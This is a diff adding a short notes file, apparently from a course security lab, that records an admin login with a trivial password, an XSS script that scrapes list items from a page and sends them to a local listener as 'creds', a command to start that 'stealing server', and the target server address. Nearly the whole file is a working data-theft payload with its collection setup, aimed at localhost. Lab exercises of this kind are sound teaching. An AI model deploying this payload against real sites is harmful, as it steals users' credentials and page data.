@@ -1,0 +1,16 @@
+Actual login:
+Username: comp3500admin
+Password: password
+
+XSS Injection Script:
+<script>
+let items = document.querySelectorAll('li');
+let data = Array.from(items).map(li => li.innerText).join('\n');
+fetch('http://localhost:9000/?creds=' + encodeURIComponent(data));
+</script>
+
+Start Stealing Server:
+python3 -m http.server 9000
+
+Original Server Link:
+http://localhost:8080/
